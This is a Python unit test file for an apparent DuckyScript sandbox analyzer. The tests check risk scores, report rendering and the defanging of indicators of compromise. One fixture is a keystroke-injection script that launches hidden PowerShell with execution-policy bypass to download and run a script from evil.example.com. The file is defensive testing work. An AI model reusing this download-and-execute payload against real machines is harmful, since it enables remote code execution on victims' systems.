import json
import unittest

from duckysandbox import analyzer, report
from duckysandbox.analyzer import Finding
from duckysandbox.emulator import emulate


PS_DOWNLOAD_PAYLOAD = "\n".join([
    "GUI r",
    "DELAY 200",
    "STRING powershell -nop -w hidden -ep bypass -Command "
    "\"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')\"",
    "ENTER",
])


class TestRiskScoring(unittest.TestCase):
    def _finding(self, severity, lineno=1):
        return Finding(
            rule_id="TEST-RULE",
            title="Test finding",
            tactic=analyzer.EXECUTION,
            technique="T0000 Test",
            severity=severity,
            evidence="evidence",
            lineno=lineno,
            explanation="explanation",
        )

    def test_compute_risk_score_sums_weights(self):
        findings = [self._finding(analyzer.LOW), self._finding(analyzer.MEDIUM)]
        self.assertEqual(report.compute_risk_score(findings), 5 + 12)

    def test_compute_risk_score_caps_at_100(self):
        findings = [self._finding(analyzer.CRITICAL) for _ in range(3)]
        self.assertEqual(report.compute_risk_score(findings), 100)

    def test_risk_rating_boundaries(self):
        self.assertEqual(report.risk_rating(0), "Informational")
        self.assertEqual(report.risk_rating(19), "Low")
        self.assertEqual(report.risk_rating(20), "Medium")
        self.assertEqual(report.risk_rating(49), "Medium")
        self.assertEqual(report.risk_rating(50), "High")
        self.assertEqual(report.risk_rating(79), "High")
        self.assertEqual(report.risk_rating(80), "Critical")
        self.assertEqual(report.risk_rating(100), "Critical")


class TestMarkdownReport(unittest.TestCase):
    def setUp(self):
        self.result = emulate(PS_DOWNLOAD_PAYLOAD, target_os="windows")
        self.md = report.render_markdown(self.result, payload_name="test.txt")

    def test_header_and_metadata(self):
        self.assertIn("# DuckyScript Behaviour Sandbox Report", self.md)
        self.assertIn("**Payload:** `test.txt`", self.md)
        self.assertIn("**Detected target OS:** windows", self.md)

    def test_risk_rating_present(self):
        score = report.compute_risk_score(self.result.findings)
        rating = report.risk_rating(score)
        self.assertIn(f"**{rating}**", self.md)
        self.assertIn(f"score {score}/100", self.md)

    def test_findings_table_lists_rule_ids(self):
        self.assertIn("## Findings", self.md)
        self.assertIn("EXEC-PS", self.md)
        self.assertIn("C2-WEBCLIENT", self.md)

    def test_attack_tactic_summary_present(self):
        self.assertIn("## ATT&CK Tactic Summary", self.md)
        self.assertIn(analyzer.EXECUTION, self.md)

    def test_process_tree_rendered(self):
        self.assertIn("## Modelled Process Tree", self.md)
        self.assertIn("explorer.exe", self.md)
        self.assertIn("powershell.exe", self.md)

    def test_iocs_defanged(self):
        self.assertIn("## Indicators of Compromise", self.md)
        self.assertIn("hxxp://evil[.]example[.]com/a[.]ps1", self.md)
        self.assertIn("evil[.]example[.]com", self.md)

    def test_execution_timeline_present(self):
        self.assertIn("## Execution Timeline", self.md)
        self.assertIn("Open the Windows Run dialog", self.md)


class TestMarkdownReportNoFindings(unittest.TestCase):
    def test_benign_payload_has_no_findings_section(self):
        result = emulate("STRING hello world\nENTER\n", target_os="windows")
        md = report.render_markdown(result, payload_name="benign.txt")
        self.assertIn("No notable techniques were detected", md)
        self.assertIn("No rule-based findings were triggered.", md)


class TestJsonReport(unittest.TestCase):
    def setUp(self):
        self.result = emulate(PS_DOWNLOAD_PAYLOAD, target_os="windows")

    def test_to_dict_keys(self):
        data = report.to_dict(self.result, payload_name="test.txt")
        for key in ("payload", "target_os", "duration_ms", "risk_score", "risk_rating",
                     "summary", "findings", "warnings", "notes", "iocs", "keystrokes",
                     "processes", "files", "registry", "network"):
            self.assertIn(key, data)
        self.assertEqual(data["payload"], "test.txt")
        self.assertEqual(data["target_os"], "windows")
        self.assertEqual(data["risk_score"], report.compute_risk_score(self.result.findings))

    def test_render_json_is_valid_json(self):
        text_out = report.render_json(self.result, payload_name="test.txt")
        data = json.loads(text_out)
        self.assertEqual(data["payload"], "test.txt")
        rule_ids = {f["rule_id"] for f in data["findings"]}
        self.assertIn("C2-WEBCLIENT", rule_ids)

    def test_findings_sorted_by_severity_desc(self):
        data = report.to_dict(self.result, payload_name="test.txt")
        ranks = [analyzer.SEVERITY_RANK.get(f["severity"], 0) for f in data["findings"]]
        self.assertEqual(ranks, sorted(ranks, reverse=True))


if __name__ == "__main__":
    unittest.main()
